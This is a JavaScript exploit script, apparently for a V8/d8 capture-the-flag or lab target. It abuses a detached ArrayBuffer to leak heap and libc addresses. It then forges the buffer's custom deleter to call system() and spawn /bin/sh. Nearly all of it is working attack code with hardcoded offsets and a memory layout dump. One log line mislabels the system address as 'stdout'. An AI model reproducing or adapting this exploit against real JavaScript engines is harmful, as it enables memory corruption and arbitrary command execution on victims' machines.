// to get heap and libc leak, create 2 arrays, detach the first one and copy it's contents to the second one
// then read the leaked addresses from the second array
let arr1 = new Uint8Array(0x1000);
let arr2 = new Uint8Array(0x1000);
let dv2 = new DataView(arr2.buffer);
%ArrayBufferDetach(arr1.buffer);
arr2.set(arr1);
let heap_leak = dv2.getBigUint64(0, true);
let libc_leak = dv2.getBigUint64(8, true);
console.log("heap leak: 0x" + heap_leak.toString(16));
console.log("libc leak: 0x" + libc_leak.toString(16));
let heap_base = heap_leak - 0x2bd40n;
let libc_base = libc_leak - 0x21ace0n;
console.log("heap base: 0x" + heap_base.toString(16));
console.log("libc base: 0x" + libc_base.toString(16));

arr1 = new ArrayBuffer(0x30);
let arr1_typed = new Uint8Array(arr1);
%ArrayBufferDetach(arr1);
arr2 = new ArrayBuffer(0x30);
arr1 = new ArrayBuffer(0x30);

// 0x55555594eb20:	0x0000555555939930	0x0000000000000030
// 0x55555594eb30:	0x0000000000000030	0x0000000000000000
// 0x55555594eb40:	0x0000000000000000	0x0000000000000048 <- custom_deleter_ flag (|= 0x40)
// 0x55555594eb50:	0x00002a930807e660	0x00000000000000d1
// 0x55555594eb60:	0x000000055555594e	0x25cc98f855ccd75d

let system = libc_base + 0x50d70n;
let stdout = libc_base + 0x21b780n;
console.log("stdout: 0x" + system.toString(16));
let aux_buf = new Uint8Array(0x30);
let dv_aux_buf = new DataView(aux_buf.buffer);
aux_buf.set(arr1_typed);

// set custom_deleter_ flag
dv_aux_buf.setBigUint64(0x28, 0x48n, true);
let crt_chunk = heap_base + 0x2bd50n;
dv_aux_buf.setBigUint64(0x18, system, true);
arr1_typed.set(aux_buf);
let dv_victim = new DataView(arr1);
// copy /bin/sh to the chunk
let bin_sh = "/bin/sh\x00";
for (let i = 0; i < bin_sh.length; i++) {
    dv_victim.setUint8(i, bin_sh.charCodeAt(i));
}
// trigger the call to system
%ArrayBufferDetach(arr1);
